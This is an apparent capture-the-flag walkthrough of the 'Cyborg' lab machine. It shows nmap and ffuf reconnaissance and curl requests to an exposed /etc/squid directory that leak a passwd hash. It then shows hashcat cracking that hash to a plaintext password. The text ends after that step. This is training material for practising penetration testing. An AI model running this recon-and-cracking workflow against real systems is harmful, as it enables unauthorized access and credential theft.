# Cyborg

Starting with default recon:
```sh
nmap -sV -T4 10.10.57.223                                
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 10:54 CEST
Nmap scan report for 10.10.57.223
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.15 seconds
```

Direcotry Scanning:
```sh
ffuf -u http://10.10.57.223/FUZZ -w ../../webhacking/wordlists/directory_scanner/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.57.223/FUZZ
 :: Wordlist         : FUZZ: /home/kali/webhacking/wordlists/directory_scanner/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 72ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 72ms]
    * FUZZ: .hta

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 72ms]
    * FUZZ: .htaccess

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 69ms]
    * FUZZ: admin

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 73ms]
    * FUZZ: etc

[Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 75ms]
    * FUZZ: index.html

[Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 75ms]
    * FUZZ: server-status

:: Progress: [4613/4613] :: Job [1/1] :: 566 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

Curling suspicious directory:
```sh
curl http://10.10.57.223/etc/                    
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /etc</title>
 </head>
 <body>
<h1>Index of /etc</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="squid/">squid/</a></td><td align="right">2020-12-30 02:09  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.57.223 Port 80</address>
</body></html>
```

Curling next:
```sh
curl http://10.10.57.223/etc/squid/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /etc/squid</title>
 </head>
 <body>
<h1>Index of /etc/squid</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/etc/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="passwd">passwd</a></td><td align="right">2020-12-30 02:09  </td><td align="right"> 52 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/script.gif" alt="[   ]"></td><td><a href="squid.conf">squid.conf</a></td><td align="right">2020-12-30 02:09  </td><td align="right">258 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.57.223 Port 80</address>
</body></html>
```

Curling last:
```sh
curl http://10.10.57.223/etc/squid/passwd 
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

Identifying found hash:
```sh
hash-identifier                                                       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
```

Bruteforce:
```
hashcat --force -m 1600 -a 0 hash.txt ../../Desktop/rockyou.txt --show                                                                                                 
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```



